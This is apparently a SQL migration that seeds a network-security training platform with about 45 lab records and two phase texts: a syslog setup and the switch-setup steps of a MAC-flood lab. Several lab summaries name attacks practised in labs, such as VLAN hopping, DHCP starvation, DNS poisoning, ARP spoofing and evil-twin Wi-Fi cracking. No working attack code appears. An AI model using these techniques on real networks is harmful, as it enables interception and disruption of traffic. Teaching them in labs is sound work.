-- ═══════════════════════════════════════════════════════════════════
-- Migration 010: capture the REAL live lab content into the migration chain.
--
-- This replaces content that had been written directly against the live
-- database (outside any migration file) during a separate work session on
-- the VPS. Converted here from a verified pg_dump --data-only export (not
-- reconstructed from a description) into plain INSERT statements, since
-- golang-migrate executes migrations via pgx's Exec() path, which cannot
-- process COPY FROM STDIN (that's a psql client-side protocol, not SQL).
--
-- ON CONFLICT DO UPDATE throughout: safe to apply even if some of this
-- content already exists from migrations 007-009.
-- ═══════════════════════════════════════════════════════════════════

-- ── labs: sort_order, book_ref, short_desc, is_free (3 free: ids 1,2,3) ──
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (15, 'network-devices', 'Network Devices & Anatomy', 'fundamentals', 'easy', FALSE, 1, 'Identify every device on the wire and what breaks when you get its role wrong.', 'Vol 1 · Ch 2')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (16, 'cabling-connectors', 'Cabling & Connectors', 'fundamentals', 'easy', FALSE, 2, 'Copper vs. fiber, straight-through vs. crossover — then diagnose a cabling fault under time pressure.', 'Vol 1 · Ch 3')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (17, 'tcpip-model', 'The TCP/IP Model', 'fundamentals', 'easy', FALSE, 3, 'Encapsulate a packet layer by layer, then race the clock tracing it back apart.', 'Vol 1 · Ch 4')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (18, 'ios-cli-bootcamp', 'Cisco IOS CLI Bootcamp', 'fundamentals', 'easy', FALSE, 4, 'EXEC modes, keyboard shortcuts, and password hygiene — speed-run the CLI like you have done this a hundred times.', 'Vol 1 · Ch 5')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (4, 'ospf-infiltration', 'OSPF infiltration', 'routing', 'medium', FALSE, 17, 'Build a 5-router OSPF network then inject rogue LSAs to poison the routing table.', 'Vol 1 · Ch 18')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (5, 'hsrp-takeover', 'HSRP takeover', 'routing', 'medium', FALSE, 18, 'Configure HSRP for first-hop redundancy then hijack the active router.', 'Vol 1 · Ch 19')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (14, 'ipv6-ndp-spoof', 'IPv6 neighbor spoof', 'routing', 'hard', FALSE, 20, 'Configure OSPFv3 and IPv6 then spoof Neighbor Advertisements for a MiTM attack.', 'Vol 1 · Ch 21')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (6, 'acl-bypass', 'ACL bypass mission', 'security', 'medium', FALSE, 23, 'Configure standard and extended ACLs then bypass them with IP fragmentation.', 'Vol 1 · Ch 24')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (7, 'cdp-lldp-espionage', 'CDP/LLDP espionage', 'security', 'easy', FALSE, 24, 'Enable CDP and LLDP then harvest the full topology passively from a switch port.', 'Vol 2 · Ch 1')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (10, 'dns-poisoning', 'DNS poisoning', 'services', 'hard', FALSE, 26, 'Configure a DNS server then race the real response to inject a poisoned A record.', 'Vol 2 · Ch 3')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (8, 'dhcp-starvation', 'DHCP starvation', 'services', 'easy', FALSE, 27, 'Configure a DHCP server then starve the pool and deploy a rogue DHCP server.', 'Vol 2 · Ch 4')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (11, 'ssh-vs-telnet', 'SSH vs Telnet autopsy', 'security', 'easy', FALSE, 28, 'Enable Telnet and SSH on a router then capture cleartext credentials in Wireshark.', 'Vol 2 · Ch 5')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (9, 'nat-unmasked', 'NAT unmasked', 'services', 'easy', FALSE, 32, 'Configure static NAT, dynamic NAT, and PAT then perform NAT traversal.', 'Vol 2 · Ch 9')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (12, 'dot1x-lockdown', '802.1X port lockdown', 'security', 'hard', FALSE, 34, 'Configure 802.1X with FreeRADIUS then crack EAP-MD5 and force EAP-TLS.', 'Vol 2 · Ch 11')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (13, 'wireless-evil-twin', 'Wireless evil twin', 'wireless', 'hard', FALSE, 41, 'Study 802.11 then clone an SSID, deauth clients, and crack the WPA2 handshake.', 'Vol 2 · Ch 20')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (22, 'subnetting-flsm', 'Subnetting I — FLSM', 'fundamentals', 'medium', FALSE, 9, 'Carve /24s, /16s, and /8s into usable subnets — then do it again with a stopwatch running.', 'Vol 1 · Ch 11.1-11.2')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (23, 'subnetting-vlsm', 'Subnetting II — VLSM', 'fundamentals', 'hard', FALSE, 10, 'Design a real multi-site VLSM addressing scheme with zero wasted address space.', 'Vol 1 · Ch 11.3-11.4')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (24, 'dtp-vtp-hijack', 'DTP & VTP', 'switching', 'medium', FALSE, 12, 'Trust the wrong switch with VTP and watch it delete every VLAN on the network for you.', 'Vol 1 · Ch 13')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (25, 'rstp-topology', 'RSTP', 'switching', 'medium', FALSE, 14, 'Force a rapid topology change and watch how much faster RSTP recovers than its ancestor.', 'Vol 1 · Ch 15')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (26, 'etherchannel-mismatch', 'EtherChannel', 'switching', 'medium', FALSE, 15, 'Bundle links for redundancy — then break the bundle with one silent LACP mismatch.', 'Vol 1 · Ch 16')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (2, 'stp-sabotage', 'STP sabotage', 'switching', 'medium', TRUE, 13, 'Build a looped, redundant 3-switch topology kept alive by Spanning Tree — then convince the whole network that your Kali box is the new root bridge.', 'Vol 1 · Ch 14')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (3, 'mac-flood-chaos', 'MAC flood chaos', 'switching', 'easy', TRUE, 5, 'Study CAM table behavior then flood it with macof to force hub mode.', 'Vol 1 · Ch 6')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (1, 'vlan-warfare', 'VLAN warfare', 'switching', 'easy', TRUE, 11, 'Build a 3-VLAN switched network with router-on-a-stick, then walk straight into a VLAN you were never allowed to touch — by convincing the switch you ARE a switch.', 'Vol 1 · Ch 12')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (19, 'ipv4-addressing', 'IPv4 Addressing', 'fundamentals', 'easy', FALSE, 6, 'Dissect the IPv4 header field by field, then reconstruct one from a hex dump against the clock.', 'Vol 1 · Ch 7')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (20, 'interfaces-autonegotiation', 'Interfaces & Autonegotiation', 'fundamentals', 'medium', FALSE, 7, 'Configure speed and duplex, then hunt down a mismatch that is silently wrecking throughput.', 'Vol 1 · Ch 8')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (21, 'routing-fundamentals', 'Routing Fundamentals', 'fundamentals', 'easy', FALSE, 8, 'Follow one packet on its entire trip from source to destination and back, hop by hop.', 'Vol 1 · Ch 9-10')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (27, 'dynamic-routing-concepts', 'Dynamic Routing Concepts', 'routing', 'easy', FALSE, 16, 'Metric vs. administrative distance — resolve a route-selection puzzle with two protocols disagreeing.', 'Vol 1 · Ch 17')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (28, 'ipv6-addressing', 'IPv6 Addressing', 'fundamentals', 'medium', FALSE, 19, 'Hexadecimal, EUI-64, and every IPv6 address type — abbreviate, expand, classify.', 'Vol 1 · Ch 20')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (29, 'tcp-udp-internals', 'TCP & UDP', 'fundamentals', 'medium', FALSE, 21, 'Three-way handshake, sequence numbers, and session disruption with a well-timed RST.', 'Vol 1 · Ch 22')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (30, 'standard-acl-logic', 'Standard ACLs', 'security', 'easy', FALSE, 22, 'Write the implicit-deny rule wrong once and lock yourself out of your own router.', 'Vol 1 · Ch 23')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (31, 'ntp-time-spoof', 'NTP', 'services', 'medium', FALSE, 25, 'Shift a device clock with spoofed NTP and watch certificate validation and logs fall apart.', 'Vol 2 · Ch 2')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (32, 'snmp-community-abuse', 'SNMP', 'services', 'medium', FALSE, 29, 'Walk an entire device configuration out the door with a default SNMPv2c community string.', 'Vol 2 · Ch 6')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (33, 'syslog-triage', 'Syslog', 'services', 'easy', FALSE, 30, 'Sort real incidents from noise across severity levels while the log stream does not stop.', 'Vol 2 · Ch 7')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (34, 'tftp-ftp-exfil', 'TFTP/FTP & IOS Upgrades', 'services', 'medium', FALSE, 31, 'Pull a full running-config off a router over a protocol that was never built to keep a secret.', 'Vol 2 · Ch 8')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (35, 'qos-under-contention', 'Quality of Service', 'services', 'medium', FALSE, 33, 'Design a QoS policy that keeps voice alive while the link is being crushed by everything else.', 'Vol 2 · Ch 10')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (36, 'port-security-bypass', 'Port Security', 'switching', 'medium', FALSE, 35, 'Lock a port to one MAC address — then flood past the limit before it shuts itself down.', 'Vol 2 · Ch 12')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (37, 'dhcp-snooping-defense', 'DHCP Snooping', 'services', 'medium', FALSE, 36, 'Deploy a rogue DHCP server, then watch DHCP Snooping trust-boundary it into oblivion.', 'Vol 2 · Ch 13')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (38, 'dynamic-arp-inspection', 'Dynamic ARP Inspection', 'security', 'hard', FALSE, 37, 'Spoof ARP to man-in-the-middle a host — then get DAI to drop every forged reply on the floor.', 'Vol 2 · Ch 14')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (39, 'lan-wan-architectures', 'LAN/WAN Architectures', 'fundamentals', 'easy', FALSE, 38, 'Redesign a flat, collapsed network as a proper three-tier architecture under real constraints.', 'Vol 2 · Ch 15-16')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (40, 'virtualization-cloud', 'Virtualization & Cloud', 'fundamentals', 'easy', FALSE, 39, 'Break container isolation between two tenants who were never supposed to see each other.', 'Vol 2 · Ch 17')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (41, 'wireless-fundamentals', 'Wireless LAN Fundamentals', 'wireless', 'easy', FALSE, 40, 'Read 802.11 frame types straight out of a live capture and identify the client association handshake.', 'Vol 2 · Ch 18-19')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (42, 'wlan-configuration', 'WLAN Configuration', 'wireless', 'medium', FALSE, 42, 'Stand up a WLC, dynamic interfaces, and a WLAN profile a real client can actually associate to.', 'Vol 2 · Ch 21')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (43, 'sdn-automation-concepts', 'Network Automation & SDN', 'automation', 'easy', FALSE, 43, 'Map the control, data, and management planes — then spot which one SDN actually centralizes.', 'Vol 2 · Ch 22')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (44, 'rest-api-abuse', 'REST APIs & Data Formats', 'automation', 'medium', FALSE, 44, 'Call an unauthenticated REST API endpoint and pull configuration data it should never have exposed.', 'Vol 2 · Ch 23-24')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;
INSERT INTO labs (id, slug, title, topic, difficulty, is_free, sort_order, short_desc, book_ref)
VALUES (45, 'config-drift-hunt', 'Ansible & Terraform', 'automation', 'medium', FALSE, 45, 'Spot the configuration drift between what Ansible thinks is deployed and what is actually running.', 'Vol 2 · Ch 25')
ON CONFLICT (id) DO UPDATE SET slug=EXCLUDED.slug, title=EXCLUDED.title, topic=EXCLUDED.topic,
  difficulty=EXCLUDED.difficulty, is_free=EXCLUDED.is_free, sort_order=EXCLUDED.sort_order,
  short_desc=EXCLUDED.short_desc, book_ref=EXCLUDED.book_ref;

-- ── lab_phases: full real content for all 135 phases ──
UPDATE lab_phases SET title='Centralised Logging', content='
<b>Topology:</b> R1+SW1 (syslog clients), Kali (syslog server). <b>Step 1</b> — Configure Kali: <code>sudo apt install rsyslog</code> → edit /etc/rsyslog.conf → uncomment UDP port 514. <b>Step 2</b> — On R1: <code>logging on</code> → <code>logging 192.168.1.100</code> → <code>logging trap debugging</code>. <b>Step 3</b> — <code>show logging</code> verifies. Every command is logged to Kali. ', is_pro_only=FALSE
WHERE lab_id=33 AND phase='build';
UPDATE lab_phases SET title='Build the Switching Foundation', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Watch a switch learn</h3><p>A switch builds its CAM (Content-Addressable Memory) table by inspecting source MAC addresses on every received frame. When it knows where every MAC lives, it forwards frames only to the right port — that''s what makes switching efficient. But that table has a finite size, and when it fills up, the switch degrades to a hub. This lab is the story of that degradation.</p></div>

<div class="stats"><span class="chip xp">✦ 300 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~20 min</span><span class="chip loot">⬡ CAM table · macof</span></div>

## The topology

One switch + two hosts + Kali. Simple enough to see the flood in action.

| Device | Role | Suggested image |
|---|---|---|
| SW1 | The switch you''ll overflow | Cisco IOSvL2 / vIOS-L2 |
| PC1 | Normal host, VLAN 1 | VPCS |
| PC2 | Second host, VLAN 1 | VPCS |
| KALI | Your flood cannon | Kali Linux |

Cable it: PC1→Gi0/1, PC2→Gi0/2, KALI→Gi0/3.

## Objectives

<ul class="objectives">
<li>Let SW1 learn MACs under normal traffic</li>
<li>Observe the CAM table with show commands</li>
<li>Confirm unicast frames arrive only where they belong</li>
</ul>

## Step 1 — Bring up the switch

```
enable
configure terminal
interface range gi0/1 - 3
 switchport mode access
 switchport access vlan 1
 no shutdown
end
```

No trunks, no VLANs — pure Layer-2 on VLAN 1. Simple.

## Step 2 — Address the hosts

On PC1 (VPCS):
```
ip 10.0.0.10 255.255.255.0 10.0.0.1
```

On PC2 (VPCS):
```
ip 10.0.0.20 255.255.255.0 10.0.0.1
```

## Step 3 — Let the switch learn

Ping between PC1 and PC2:
```
ping 10.0.0.20       ! from PC1
```

Then check what SW1 learned:
```
show mac address-table
```

You''ll see PC1 on Gi0/1 and PC2 on Gi0/2. The switch mapped two MACs to two ports. Efficient.

<div class="callout info"><p>This is the <strong>before</strong> picture. In the attack phase you''ll fill every slot until the switch forgets its own map and starts shouting frames at every port.</p></div>

```
show mac address-table count
```

Note the current count and the max entries. That maximum is the ceiling you''re about to hit.

